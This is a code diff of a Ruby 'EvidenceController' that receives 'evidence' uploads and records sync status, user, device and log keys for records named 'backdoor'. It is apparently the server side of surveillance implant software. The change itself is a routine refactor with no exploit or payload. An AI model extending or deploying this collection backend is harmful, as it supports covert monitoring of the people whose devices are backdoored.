@@ -20,16 +20,6 @@ module DB
 
 class EvidenceController < RESTController
 
-  def index
-    require_auth_level :viewer
-    trace :debug, "INDEX #{params}"
-  end
-
-  def show
-    require_auth_level :viewer
-    trace :debug, "SHOW #{params}"
-  end
-
   # this must be a POST request
   # the instance is passed as parameter to the uri
   # the content is passed as body of the request
@@ -37,11 +27,11 @@ class EvidenceController < RESTController
     require_auth_level :server
 
     # create a phony session
-    session = {:instance => params['evidence']}
+    session = {:instance => @params['evidence']}
 
     # save the evidence in the db
     begin
-      id = EvidenceManager.instance.store_evidence session, @req_content.size, @req_content
+      id = EvidenceManager.instance.store_evidence session, @request[:content].size, @request[:content]
       # notify the worker
       trace :info, "Evidence saved. Notifying worker of [#{session[:instance]}][#{id}]"
       notification = {session[:instance] => [id]}.to_json
@@ -51,31 +41,31 @@ class EvidenceController < RESTController
       return RESTController.not_found
     end
     
-    return RESTController.ok({:bytes => @req_content.size})
+    return RESTController.ok({:bytes => @request[:content].size})
   end
   
   # used to report that the activity of an instance is starting
   def start
     require_auth_level :server
-
+    
     # create a phony session
-    session = params.symbolize
-
+    session = @params.symbolize
+    
     # retrieve the key from the db
     backdoor = Item.where({_id: session[:bid]}).first
     key = backdoor[:logkey]
     
     # convert the string time to a time object to be passed to 'sync_start'
-    time = Time.at(params['sync_time']).getutc
+    time = Time.at(@params['sync_time']).getutc
     
     # store the status
-    EvidenceManager.instance.sync_start session, params['version'], params['user'], params['device'], params['source'], time.to_i, key
+    EvidenceManager.instance.sync_start session, @params['version'], @params['user'], @params['device'], @params['source'], time.to_i, key
 
     # update the stats
     backdoor.stat[:last_sync] = time
-    backdoor.stat[:source] = params['source']
-    backdoor.stat[:user] = params['user']
-    backdoor.stat[:device] = params['device']
+    backdoor.stat[:source] = @params['source']
+    backdoor.stat[:user] = @params['user']
+    backdoor.stat[:device] = @params['device']
     backdoor.save
     
     return RESTController.ok
@@ -86,7 +76,7 @@ class EvidenceController < RESTController
     require_auth_level :server
 
     # create a phony session
-    session = params.symbolize
+    session = @params.symbolize
 
     # store the status
     EvidenceManager.instance.sync_end session
@@ -99,7 +89,7 @@ class EvidenceController < RESTController
     require_auth_level :server
 
     # create a phony session
-    session = params.symbolize
+    session = @params.symbolize
 
     # store the status
     EvidenceManager.instance.sync_timeout session
